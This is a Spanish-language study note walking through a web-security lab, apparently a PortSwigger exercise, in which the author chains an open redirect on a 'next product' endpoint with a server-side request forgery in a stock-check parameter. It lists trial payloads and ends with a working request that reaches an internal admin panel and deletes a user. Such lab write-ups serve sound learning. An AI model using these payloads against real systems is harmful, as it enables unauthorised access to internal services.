![[Pasted image 20230912140507.png]]

![[Pasted image 20230912140648.png]]

![[Pasted image 20230912140711.png]]

![[Pasted image 20230912140745.png]]

![[Pasted image 20230912140823.png]]

![[Pasted image 20230912140842.png]]

![[Pasted image 20230912140930.png]]

presionando Ctrl+U para hacer un encode en el repeater:

![[Pasted image 20230912141022.png]]

stockApi=/product/stock/check%3fproductId%3d1%26storeId%3d2

pruebas para armar el payload:

stockApi=127.0.0.1/admin
stockApi=192.168.0.12:8080/admin

![[Pasted image 20230912141219.png]]

tratando de encodear toda la cadena:
stockApi%3d192.168.0.12%3a8080/admin  -> aca ni siquiera reconoce la variable stockApi

stockApi=192.168.0.12%3a8080/admin

![[Pasted image 20230912141434.png]]

uniendo ambas cadenas:


stockApi=/product/stock/check?productId=1&storeId=2&192.168.0.12%3a8080/admin

stockApi=/product/stock/check%3fproductId%3d1%26storeId%3d2%26192.168.0.12%253a8080/admin

![[Pasted image 20230912141628.png]]

el payload es valido pero no tengo la redireccion, tambien probe usando este payload:

stockApi=/product/stock/check?productId=1&storeId=192.168.0.12:8080/admin
stockApi=/product/stock/check?productId=1%26storeId%3d192.168.0.12%3a8080/admin

pobe quitar storeId y ahi si me genera un error 400 (falta un parametro)

En el lab hay un boton que dice "Next Product", haciendo click en éste, en esencia me lleva a otro producto, o sea una redireccion:

![[Pasted image 20230912143306.png]]

![[Pasted image 20230912143251.png]]

buscando el endpoint en la lista del burp:

![[Pasted image 20230912143413.png]]

llama la atencion que es un 302 asi que este tiene que ser:

![[Pasted image 20230912143505.png]]

/product/nextProduct?currentProductId=1&path=/product?productId=2

notese que es un request GET, probando el payload:

/product/nextProduct?currentProductId=1&path=192.168.0.12:8080/admin

![[Pasted image 20230912143638.png]]

si presiono Follow Redirection: 
![[Pasted image 20230912143720.png]]

probando limpiar el payload:

![[Pasted image 20230912143818.png]]

Aca la clave es jugar con el payload, no desesperarse y hacer varias pruebas, leyendo la respuesta mi error fue que en nextProduct debía poner la redireccion, no en el PATH, de manera que mi payload fue así:

GET /product/nextProduct?currentProductId=1&path=192.168.0.12:8080/admin

cuando lo correcto es:

GET /product/nextProduct?192.168.0.12:8080/admin

![[Pasted image 20230912144154.png]]

la misma aplicacion te guía con los output, agregando:

GET /product/nextProduct?path=192.168.0.12:8080/admin

![[Pasted image 20230912144304.png]]

pero al darle Follow Redirection me vuelve a generar un error:

![[Pasted image 20230912144601.png]]

pues bien, tuve que ver el video de Michael Sommer, y el request GET me sirvio para armar la linea, despues me regreso al metodo POST y uso el payload:

Este es el payload que funciona pues obtuve un 302:

GET /product/nextProduct?path=192.168.0.12:8080/admin

ahora trato de pegarlo en el Repeater con el endpoint POST:

![[Pasted image 20230912145249.png]]

recordemos que debo especificar el protocolo de acceso al host, lo cual tiene logica, modificando:

/product/nextProduct?path=http://192.168.0.12:8080/admin

![[Pasted image 20230912145345.png]]

para resolver el lab:

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

![[Pasted image 20230912145419.png]]

